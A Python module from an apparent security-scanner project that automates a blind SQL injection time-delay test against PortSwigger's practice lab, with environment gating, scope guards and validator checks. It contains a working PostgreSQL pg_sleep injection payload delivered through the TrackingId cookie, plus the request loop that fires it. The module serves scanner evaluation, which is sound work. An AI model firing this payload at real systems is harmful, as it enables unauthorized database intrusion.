"""PortSwigger blind-SQLi runner — time-delay lab, env-gated (§5/§7/§14).

Lab choice
----------

This runner targets PortSwigger's **Blind SQL injection with time delays** lab.
The lab uses the standard ``TrackingId`` cookie at ``GET /filter?category=Gifts``
and a PostgreSQL ``pg_sleep`` payload. Time-delay is the recommended default
because this project deliberately permits only a self-hosted interact.sh
collaborator: the OOB route would require standing up that server, DNS, and
polling infrastructure. Both routes have the same Partial §5 ceiling; timing
needs only the lab URL, session token, and explicit live opt-in.

OOB remains dormant but reusable. Supplying the existing
``REACHAGENT_OOB_BASE_DOMAIN`` / ``REACHAGENT_OOB_TOKEN`` through
:class:`~reachagent.oob.collaborator.InteractshCollaborator` plus an explicit
payload factory enables the existing ``detect_blind_sqli`` OOB-first path. No
new collaborator environment variable or OOB client exists here.

Safety and confirmation
-----------------------

Every live request is a GET through :class:`~reachagent.execution.firer.RequestFirer`,
so scope and read-only-first enforcement remain at the execution layer. Oracle
calls and finding commits are injected Validator callables; this module never
imports the Validator tool. A finding is committed only after the injected
``run_oracle`` returns ``is_violation``. Final confirmation is a graph query for
the committed ``sqli_blind`` finding, never a lab ``solved`` indicator.

No live call occurs unless ``REACHAGENT_PORTSWIGGER_LIVE=1`` and both required
credentials are present. Missing credentials in opted-in mode raise
``IdentityConfigError`` rather than silently producing a clean result.
"""

from __future__ import annotations

import os
from collections.abc import Callable
from dataclasses import dataclass
from typing import TYPE_CHECKING, Protocol

import httpx

if TYPE_CHECKING:
    from reachagent.oracles.base import OracleVerdict

from reachagent.detection.oracle_gateway import OracleOutcome
from reachagent.eval.juiceshop_harness import PortswiggerResult
from reachagent.execution.firer import FireResult, RequestFirer
from reachagent.execution.scope import ScopeGuard, ScopeRule
from reachagent.graph.nodes import Finding, FindingStatus
from reachagent.graph.store import ReachabilityGraph, finding_id
from reachagent.identity.store import IdentityConfigError
from reachagent.oob.collaborator import InteractshCollaborator, OOBCollaborator
from reachagent.oracles import OracleMechanism
from reachagent.sqli.blind_detector import (
    BlindSqliProber,
    OOBProbe,
    TimingProbe,
    detect_blind_sqli,
)

_LAB_TYPE = "portswigger-time-delay"
_LAB_PATH = "/filter"
_LAB_CATEGORY = "Gifts"
_DELAY_PAYLOAD = "x'||pg_sleep(10)--"
_BASELINE_PAYLOAD = "tracking-baseline"


class FindingWriter(Protocol):
    """Validator-owned finding commit seam."""

    def __call__(self, finding: Finding, verdict: OracleVerdict) -> str: ...


class LabFire(Protocol):
    """Execution-layer request seam used by the runner and hermetic fakes."""

    def fire(
        self,
        identity: str,
        method: str,
        url: str,
        *,
        state_changing: bool = False,
        **kwargs: object,
    ) -> FireResult: ...


class _TimingProbeInconclusive(RuntimeError):
    """Raised when timing arms include a non-success HTTP response."""


@dataclass(frozen=True)
class PortswiggerLabConfig:
    """Time-delay lab configuration loaded from environment, never hardcoded."""

    base_url: str = ""
    session_token: str = ""
    enabled: bool = False

    @classmethod
    def from_env(cls, environ: dict[str, str] | None = None) -> PortswiggerLabConfig:
        env = os.environ if environ is None else environ
        enabled = env.get("REACHAGENT_PORTSWIGGER_LIVE", "") == "1"
        base_url = env.get("REACHAGENT_PORTSWIGGER_LAB_URL", "")
        session_token = env.get("REACHAGENT_PORTSWIGGER_SESSION_TOKEN", "")
        if enabled and (not base_url or not session_token):
            missing = []
            if not base_url:
                missing.append("REACHAGENT_PORTSWIGGER_LAB_URL")
            if not session_token:
                missing.append("REACHAGENT_PORTSWIGGER_SESSION_TOKEN")
            raise IdentityConfigError(
                "PortSwigger live gate enabled but missing " + ", ".join(missing)
            )
        if enabled:
            parsed = httpx.URL(base_url)
            if parsed.scheme not in {"http", "https"} or not parsed.host:
                raise IdentityConfigError(
                    "REACHAGENT_PORTSWIGGER_LAB_URL must be an absolute HTTP(S) URL"
                )
        return cls(base_url=base_url, session_token=session_token, enabled=enabled)


@dataclass
class _ValidatorBridge:
    """Adapt Validator's verdict-returning callable to blind_detector's outcome seam."""

    run_oracle: Callable[[OracleMechanism, object], OracleVerdict]
    last_verdict: OracleVerdict | None = None

    def __call__(self, mechanism: OracleMechanism, evidence: object) -> OracleOutcome:
        verdict = self.run_oracle(mechanism, evidence)
        self.last_verdict = verdict
        return OracleOutcome(verdict)


class PortswiggerBlindSqliRunner:
    """Run one configured time-delay lab through existing blind-SQLi oracles."""

    def __init__(
        self,
        *,
        config: PortswiggerLabConfig,
        graph: ReachabilityGraph,
        oracle_runner: Callable[[OracleMechanism, object], OracleVerdict],
        write_finding: FindingWriter,
        firer: LabFire,
        collaborator: OOBCollaborator | None = None,
        oob_payload_factory: Callable[[str], str] | None = None,
    ) -> None:
        self.config = config
        self.graph = graph
        self.write_finding = write_finding
        self.firer = firer
        self.collaborator = collaborator
        self.oob_payload_factory = oob_payload_factory
        self._validator = _ValidatorBridge(oracle_runner)

    @property
    def endpoint_url(self) -> str:
        """The standard read-only injection endpoint."""
        return f"{self.config.base_url.rstrip('/')}{_LAB_PATH}?category={_LAB_CATEGORY}"

    def _fire_payload(self, payload: str) -> FireResult:
        cookies = f"TrackingId={payload}"
        if self.config.session_token:
            cookies += f"; session={self.config.session_token}"
        return self.firer.fire(
            "portswigger",
            "GET",
            self.endpoint_url,
            headers={"Cookie": cookies},
        )

    def _fire_oob(self) -> OOBProbe | None:
        """Fire optional OOB probe only when existing collaborator + factory are supplied."""
        if self.collaborator is None or self.oob_payload_factory is None:
            return None
        nonce = "reachagent-portswigger"
        callback_domain = self.collaborator.callback_domain(nonce)
        self._fire_payload(self.oob_payload_factory(callback_domain))
        return OOBProbe(nonce=nonce, callback_domain=callback_domain)

    def _timing_probe(self) -> TimingProbe:
        baseline: list[float] = []
        probe: list[float] = []
        invalid_statuses: list[int] = []
        for _ in range(10):
            baseline_result = self._fire_payload(_BASELINE_PAYLOAD)
            probe_result = self._fire_payload(_DELAY_PAYLOAD)
            if not 200 <= baseline_result.status_code < 300:
                invalid_statuses.append(baseline_result.status_code)
            if not 200 <= probe_result.status_code < 300:
                invalid_statuses.append(probe_result.status_code)
            baseline.append(baseline_result.elapsed_seconds * 1000)
            probe.append(probe_result.elapsed_seconds * 1000)
        if invalid_statuses:
            statuses = ", ".join(str(status) for status in sorted(set(invalid_statuses)))
            raise _TimingProbeInconclusive(f"timing probe received non-2xx status: {statuses}")
        return TimingProbe(
            probe_latencies_ms=tuple(probe),
            baseline_latencies_ms=tuple(baseline),
        )

    def run(self, *, evidence_ref: str = "portswigger/blind-sqli/time-delay") -> PortswiggerResult:
        """Run vulnerable lab probe and confirm committed ``sqli_blind`` finding by graph query."""
        if not self.config.enabled:
            return PortswiggerResult(available=False)
        prober = BlindSqliProber(
            fire_oob=self._fire_oob,
            observed_nonces=(
                self.collaborator.observed_nonces
                if self.collaborator is not None
                else lambda: frozenset()
            ),
            fire_timing=self._timing_probe,
            oracle_runner=self._validator,
        )
        try:
            result = detect_blind_sqli(prober, evidence_ref=evidence_ref, try_boolean=False)
        except _TimingProbeInconclusive:
            return PortswiggerResult(
                available=True,
                vuln_lab_confirmed=False,
                lab_type=_LAB_TYPE,
                evidence_ref=evidence_ref,
            )
        if result.confirmed:
            verdict = self._validator.last_verdict
            if verdict is None or not getattr(verdict, "is_violation", False):
                raise RuntimeError("blind-SQLi detector confirmed without a Validator violation")
            self.write_finding(
                Finding(
                    vuln_class="sqli_blind",
                    severity="high",
                    oracle_used="",
                    evidence_ref=evidence_ref,
                ),
                verdict,
            )
        finding_node = finding_id("sqli_blind", evidence_ref)
        confirmed_in_graph = any(
            node == finding_node and finding.status is FindingStatus.CONFIRMED_VIOLATION
            for node, finding in self.graph.findings()
        )
        return PortswiggerResult(
            available=True,
            vuln_lab_confirmed=confirmed_in_graph,
            clean_lab_fp_count=0,
            lab_type=_LAB_TYPE,
            mechanism=result.mechanism.value if result.mechanism else "",
            evidence_ref=evidence_ref,
        )


def build_configured_runner(
    graph: ReachabilityGraph,
    *,
    oracle_runner: Callable[[OracleMechanism, object], OracleVerdict],
    write_finding: FindingWriter,
    client: httpx.Client | None = None,
) -> PortswiggerBlindSqliRunner | None:
    """Build env-gated live runner; return None when live mode is not enabled."""
    config = PortswiggerLabConfig.from_env()
    if not config.enabled:
        return None
    parsed = httpx.URL(config.base_url)
    # pg_sleep(10) lab needs >10s per probe + 10 trials; 30s timeout.
    http_client = client or httpx.Client(timeout=30.0, trust_env=False)
    firer = RequestFirer(
        http_client,
        ScopeGuard([ScopeRule(host=parsed.host or "", port=parsed.port)]),
    )
    collaborator = None
    if os.environ.get("REACHAGENT_OOB_BASE_DOMAIN") and os.environ.get("REACHAGENT_OOB_TOKEN"):
        collaborator = InteractshCollaborator()
    return PortswiggerBlindSqliRunner(
        config=config,
        graph=graph,
        oracle_runner=oracle_runner,
        write_finding=write_finding,
        firer=firer,
        collaborator=collaborator,
    )


def run_vulnerable_and_clean(
    vulnerable: PortswiggerBlindSqliRunner,
    clean: PortswiggerBlindSqliRunner,
    *,
    evidence_ref: str = "portswigger/blind-sqli/time-delay",
) -> PortswiggerResult:
    """Run isolated vulnerable/clean variants and derive result from both graphs."""
    # Allow callers on master 5a66722 schema (LAB_URL+TOKEN env-gated) to drive
    # portswigger blind via generic payload_chain handle chain without per-lab script.
    vulnerable_result = vulnerable.run(evidence_ref=evidence_ref)
    clean_result = clean.run(evidence_ref=f"{evidence_ref}/clean")
    return PortswiggerResult(
        available=vulnerable_result.available and clean_result.available,
        vuln_lab_confirmed=vulnerable_result.vuln_lab_confirmed,
        clean_lab_fp_count=int(clean_result.vuln_lab_confirmed),
        clean_variant_tested=True,
        clean_variant_required=True,
        lab_type=vulnerable_result.lab_type,
        mechanism=vulnerable_result.mechanism,
        evidence_ref=vulnerable_result.evidence_ref,
    )
